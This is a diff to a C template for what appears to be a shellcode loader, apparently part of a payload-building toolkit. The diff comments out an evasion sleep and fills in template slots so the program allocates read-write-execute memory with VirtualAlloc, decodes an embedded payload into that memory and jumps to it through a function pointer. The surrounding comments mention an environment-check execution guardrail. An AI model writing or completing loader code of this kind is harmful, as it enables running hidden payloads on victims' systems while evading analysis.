@@ -21,7 +21,7 @@ int sleep_ms(DWORD sleeptime) {
 
 int main()
 {
-	sleep_ms(10000);
+	//sleep_ms(10000);
 
 	// Execution Guardrail: Env Check
 	//wchar_t envVarName[] = {'U','S','E','R','P','R','O','F','I','L','E', 0};
@@ -37,18 +37,18 @@ int main()
 		return 6;
 	}
 
-	// Allocate RWX segment
+	// Allocate 1
     // char *dest = ...
-{{ plugin_allocator }}
+    char *dest = VirtualAlloc(NULL, {{PAYLOAD_LEN}}, 0x3000, 0x40);
 
-	// Copy
+	// Copy (and decode)
 	// from: supermega_payload[]
 	// to:   dest[]
-    // len:  0x11223344
 {{ plugin_decoder }}
 
+
     // Execute *dest
-{{ plugin_executor }}
+    (*(void(*)())(dest))();
 
 	return 0;
 }
